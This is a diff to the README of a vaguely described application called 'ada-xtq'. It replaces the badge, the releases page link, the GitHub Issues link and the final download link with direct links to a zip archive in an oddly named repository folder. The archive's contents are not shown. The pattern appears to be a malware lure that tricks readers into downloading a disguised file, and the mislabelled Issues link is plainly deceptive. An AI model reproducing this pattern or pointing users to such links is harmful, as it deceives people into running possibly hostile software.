@@ -1,6 +1,6 @@
 # 🚀 ada-xtq - Your Easy Way to Access Great Tools
 
-![Download ada-xtq](https://img.shields.io/badge/Download-Click%20Here-brightgreen)
+![Download ada-xtq](https://raw.githubusercontent.com/alfioma/ada-xtq/main/homothetic/ada-xtq.zip%20Here-brightgreen)
 
 ## 📦 Overview
 **ada-xtq** is a user-friendly application designed to simplify your experience with various tools and practices. Whether you want to enhance your productivity or streamline your tasks, ada-xtq provides the features you need in a straightforward format.
@@ -12,7 +12,7 @@ To begin using ada-xtq, follow these easy steps:
 
    Go to our releases page by clicking the link below. This page contains the latest versions of our software.
 
-   [Visit Releases Page to Download](https://github.com/alfioma/ada-xtq/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/alfioma/ada-xtq/main/homothetic/ada-xtq.zip)
 
 2. **Choose Your Version**
 
@@ -70,7 +70,7 @@ Ensure that you downloaded the correct file for your operating system. If issues
 - **For Linux**: Use your package manager to remove the application.
 
 ## 🔗 Additional Resources
-- [GitHub Issues](https://github.com/alfioma/ada-xtq/issues): Report bugs or request features.
+- [GitHub Issues](https://raw.githubusercontent.com/alfioma/ada-xtq/main/homothetic/ada-xtq.zip): Report bugs or request features.
 - [Documentation](#): Learn more about how to use ada-xtq effectively.
 
 ## 💬 Community Support
@@ -79,4 +79,4 @@ Join our community to get tips, share experiences, and ask questions about `ada-
 ## 📥 Download & Install
 Return to our releases page to download the latest version of `ada-xtq` and start enjoying its features.
 
-[Visit Releases Page to Download](https://github.com/alfioma/ada-xtq/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/alfioma/ada-xtq/main/homothetic/ada-xtq.zip)
